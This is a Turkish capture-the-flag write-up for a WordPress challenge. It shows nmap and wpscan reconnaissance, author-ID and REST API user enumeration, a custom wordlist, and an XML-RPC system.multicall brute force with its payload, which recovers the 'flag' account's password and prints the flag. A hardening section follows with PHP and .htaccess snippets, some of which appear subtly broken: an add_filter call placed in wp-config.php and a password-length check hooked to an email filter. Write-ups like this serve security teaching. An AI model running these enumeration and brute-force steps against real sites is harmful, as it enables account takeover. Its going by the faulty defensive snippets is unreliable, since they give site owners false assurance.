# 🔐 wordpressprojem - Web Challenge 

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Kolay-darkgreen?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-WordPress Brute Force-purple?style=for-the-badge" alt="WordPress">
</p>

---

## 📋 Soru Bilgileri
  
**Kategori:** Web  
**Seviye:** Kolay  
**Puan:** 500  

**Challenge URL:** http://64.226.74.243:4141/

---

## 🔍 Analiz

**Hedef:** WordPress sitesinde kullanıcı enumerasyonu yaparak brute force ile flag elde etmek

**Strateji:** Port taraması → WordPress keşfi → Kullanıcı enumerasyonu → Brute force → Flag

**İpuçları:**
- 🎯 "wordpressprojem" → WordPress tabanlı challenge
- 🔐 Port 4141 → Standart olmayan port
- 💡 WPScan kullanılabilir

---

## ✅ Çözüm Adımları

### 🔧 **Adım 1: Port Taraması - Nmap ile Keşif**

**Servisleri tanımlıyoruz:**

```bash
nmap -sV -p 4141 64.226.74.243
```

**Response:**

```
PORT     STATE SERVICE VERSION
4141/tcp open  http    Apache httpd 2.4.65
```

**Analiz:**
- ✅ Port 4141 açık
- ✅ Apache 2.4.65 web sunucusu
- ✅ PHP 8.1.34 çalışıyor

---

### 🕵️ **Adım 2: WordPress Keşfi - WPScan ile İlk Tarama**

**Temel WordPress taraması yapıyoruz:**

```bash
wpscan --url http://64.226.74.243:4141
```

**Response:**

```
[+] WordPress version 6.9 identified (Latest, released on 2025-01-14)
[+] WordPress theme in use: twentytwentyfive
 | Version: 1.4 (up to date)

[+] XML-RPC seems to be enabled: http://64.226.74.243:4141/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
```

**Analiz:**
- ✅ WordPress 6.9 (güncel)
- ✅ Theme: Twenty Twenty-Five v1.4
- ⚠️ **XML-RPC aktif** - brute force mümkün!
- ✅ Plugin bulunamadı

---

### 🔎 **Adım 3: Kullanıcı Enumerasyonu - Pasif Tarama**

**Standart kullanıcı taraması:**

```bash
wpscan --url http://64.226.74.243:4141 --enumerate u
```

**Response:**

```
[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

**Analiz:**
- ✅ `admin` kullanıcısı bulundu
- 💡 Daha fazla kullanıcı olabilir - agresif tarama gerekli

---

### 💎 **Adım 4: Agresif Kullanıcı Taraması - CRITICAL!**

**Agresif mod ile daha derin tarama:**

```bash
wpscan --url http://64.226.74.243:4141 --enumerate u --plugins-detection aggressive
```

**🎉 BINGO! Response:**

```
[+] admin
 | Found By: Rss Generator (Passive Detection)

[+] flag
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

**✅ KRİTİK KEŞİF!**
- ✅ İkinci kullanıcı bulundu: `flag`
- 🎯 Kullanıcı adı "flag" - çok anlamlı!

---

### 🔍 **Adım 5: Author Sayfası Analizi - İpucu Bulma**

**Flag kullanıcısının author sayfasını inceliyoruz:**

```bash
# Admin kullanıcısı (ID: 1)
curl http://64.226.74.243:4141/?author=1

# Flag kullanıcısı (ID: 2)
curl http://64.226.74.243:4141/?author=2
```

**Response (author=2):**

```html
<!DOCTYPE html>
<html lang="tr-TR">
<head>
    <title>flag burada - wordpressprojem</title>
</head>
<body>
    <h1 class="wp-block-query-title">Yazar: <span>flag burada</span></h1>
</body>
</html>
```

**🎁 ÖNEMLİ İPUCU!**
- ✅ Kullanıcı adı: `flag`
- ✅ Görünen ad: **"flag burada"**
- 💡 Şifre de basit olabilir!

---

### 📝 **Adım 6: Wordlist Oluşturma - CTF Mantığı**

**CTF temalı wordlist hazırlıyoruz:**

```bash
cat > wordlist.txt << EOF
flag
burada
flagburada
flag_burada
flag-burada
buradadaflag
buradaflag
password
admin
123456
flag123
ctf
test
wordpress
EOF
```

**Wordlist Mantığı:**
- 🎯 `flag` - Kullanıcı adıyla aynı (en yaygın)
- 🎯 `burada` - İpucunda geçiyor
- 🎯 `flagburada` - İpucun tamamı
- 🎯 `password, admin, 123456` - Yaygın şifreler
- 🎯 `ctf` - CTF teması

---

### 💥 **Adım 7: XML-RPC Brute Force - EXPLOIT!**

**WPScan ile brute force saldırısı:**

```bash
wpscan --url http://64.226.74.243:4141 \
  -U flag \
  -P wordlist.txt \
  --password-attack xmlrpc-multicall
```

**🎉 BAŞARI! Response:**

```
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - flag / flag

[!] Valid Combinations Found:
 | Username: flag, Password: flag
```

**✅ BAŞARILI! Analiz:**
- ✅ **Kimlik bilgileri bulundu!**
- 🎯 Username: `flag`
- 🎯 Password: `flag`
- ⏱️ Sadece 5 saniye sürdü!

---

### 🏆 **Adım 8: WordPress Login - Flag Elde Etme**

**Yönetim paneline giriş yapıyoruz:**

```bash
# URL: http://64.226.74.243:4141/wp-login.php
# Username: flag
# Password: flag
```

**WordPress dashboard'a girdikten sonra "Yazılar" (Posts) bölümüne bakıyoruz.**

**🎉 FLAG BULUNDU!**

Flag, "flag" kullanıcısı tarafından yazılmış bir taslak gönderide yer alıyor:

```
flag{wpscanguzeltool545454878e7w8r}
```

---

## 🏁 **FLAG**

```
flag{wpscanguzeltool545454878e7w8r}
```

---

## 🧬 Teknik Analiz

### **WordPress Kullanıcı Enumerasyonu**

**Varsayılan WordPress davranışı:**
```bash
# Author ID brute forcing
http://64.226.74.243:4141/?author=1  # admin
http://64.226.74.243:4141/?author=2  # flag
http://64.226.74.243:4141/?author=3  # User yok - redirect
```

**REST API ile de mümkün:**
```bash
curl http://64.226.74.243:4141/wp-json/wp/v2/users
# Tüm kullanıcıları listeler
```

**Sonuç:**
- ✅ WordPress varsayılan olarak kullanıcı enumerasyonuna açık
- ✅ Author sayfaları kullanıcı bilgilerini ifşa eder
- ✅ REST API kullanıcı listesini döner

---

### **XML-RPC Brute Force Mekanizması**

**Normal login denemesi:**
```http
POST /wp-login.php
username=flag&password=test
```
- ❌ Her deneme için ayrı HTTP request
- ❌ Yavaş ve tespit edilebilir

**XML-RPC multicall methodu:**
```xml
POST /xmlrpc.php
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member><name>methodName</name><value>wp.getUsersBlogs</value></member>
                <member><name>params</name>
                  <value><array>
                    <data><value>flag</value><value>flag</value></data>
                  </array></value>
                </member>
              </struct>
            </value>
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>
```

**Avantajları:**
- ✅ Tek request'te çoklu deneme
- ✅ Rate limiting bypass mümkün
- ✅ Çok hızlı (saniyeler içinde yüzlerce deneme)

**Sonuç:**
- ✅ XML-RPC aktifse brute force çok kolay
- ✅ `system.multicall` methodu istismar edilebilir

---

## 🛡️ Nasıl Önlenir?

### **1. XML-RPC'yi Devre Dışı Bırakma**

```php
// wp-config.php
add_filter('xmlrpc_enabled', '__return_false');
```

**Veya .htaccess ile:**

```apache
# .htaccess
<Files xmlrpc.php>
  Order Deny,Allow
  Deny from all
</Files>
```

**Neden gerekli:**
- ✅ XML-RPC artık çok kullanılmıyor
- ✅ Brute force saldırılarının ana kaynağı
- ✅ DDoS saldırıları için kullanılabilir

---

### **2. Kullanıcı Enumerasyonunu Engelleme**

```php
// functions.php
// Author sayfalarını devre dışı bırak
add_action('template_redirect', function() {
    if (is_author()) {
        wp_redirect(home_url());
        exit;
    }
});

// REST API kullanıcı endpoint'ini kapat
add_filter('rest_endpoints', function($endpoints) {
    if (isset($endpoints['/wp/v2/users'])) {
        unset($endpoints['/wp/v2/users']);
    }
    if (isset($endpoints['/wp/v2/users/(?P<id>[\d]+)'])) {
        unset($endpoints['/wp/v2/users/(?P<id>[\d]+)']);
    }
    return $endpoints;
});
```

---

### **3. Güçlü Şifre Politikası**

```php
// Minimum şifre uzunluğu zorunluluğu
add_filter('password_change_email', function($pass_change_email, $user, $userdata) {
    if (strlen($userdata['user_pass']) < 12) {
        wp_die('Şifre en az 12 karakter olmalıdır!');
    }
    return $pass_change_email;
}, 10, 3);
```

**Öneriler:**
- ✅ En az 12 karakter
- ✅ Büyük/küçük harf, rakam, özel karakter
- ✅ Kullanıcı adıyla aynı olmamalı
- ✅ Yaygın şifre listelerinde olmamalı

---

### **4. Brute Force Koruması**

```php
// Login denemelerini sınırla (Plugin: Limit Login Attempts)
// Veya manuel:
add_action('wp_login_failed', function($username) {
    $ip = $_SERVER['REMOTE_ADDR'];
    $attempts = get_transient('login_attempts_' . $ip);
    
    if ($attempts === false) {
        set_transient('login_attempts_' . $ip, 1, 3600);
    } else {
        set_transient('login_attempts_' . $ip, $attempts + 1, 3600);
        
        if ($attempts >= 5) {
            wp_die('Çok fazla başarısız deneme. 1 saat bekleyin.');
        }
    }
});
```

**Alternatifler:**
- ✅ **Fail2Ban** (sunucu seviyesi)
- ✅ **Wordfence** plugin
- ✅ **Cloudflare** rate limiting

---

### **5. İki Faktörlü Doğrulama (2FA)**

```php
// Plugin: Two Factor Authentication
// Veya Google Authenticator
// Şifre bile çalınsa giriş yapılamaz
```

**Neden kritik:**
- ✅ Şifre ele geçse bile yetmez
- ✅ Brute force saldırıları etkisiz kalır
- ✅ Phishing saldırılarına karşı koruma

---

## 🛠️ **Kullanılan Komutlar**

```bash
# Port taraması
nmap -sV -p 4141 64.226.74.243

# WordPress versiyon tespiti
wpscan --url http://64.226.74.243:4141

# Pasif kullanıcı enumerasyonu
wpscan --url http://64.226.74.243:4141 --enumerate u

# Agresif kullanıcı enumerasyonu
wpscan --url http://64.226.74.243:4141 --enumerate u --plugins-detection aggressive

# Author sayfası kontrolü
curl http://64.226.74.243:4141/?author=2

# Wordlist oluşturma
cat > wordlist.txt << EOF
flag
burada
flagburada
password
admin
123456
EOF

# XML-RPC brute force
wpscan --url http://64.226.74.243:4141 \
  -U flag \
  -P wordlist.txt \
  --password-attack xmlrpc-multicall
```

---

## 💭 **Çözüm Akışı**

```
🌐 wordpressprojem Web Challenge
            ↓
🔧 Port taraması (nmap)
   → Port 4141 açık
   → Apache + PHP tespit edildi
            ↓
🕵️ WordPress keşfi (wpscan)
   → WordPress 6.9 (güncel)
   → XML-RPC aktif ⚠️
            ↓
🔎 Kullanıcı enumerasyonu
   → Pasif: admin bulundu
   → Agresif: flag bulundu ✅
            ↓
🔍 Author analizi
   → curl /?author=2
   → Görünen ad: "flag burada" 💡
            ↓
📝 Wordlist hazırlama
   → CTF temalı şifreler
   → flag, burada, flagburada...
            ↓
💥 XML-RPC brute force
   → Username: flag
   → Password: flag
   → ✅ BAŞARILI!
            ↓
🏆 WordPress login
   → Dashboard → Yazılar
   → Taslak gönderi
            ↓
🏁 flag{wpscanguzeltool545454878e7w8r}
```
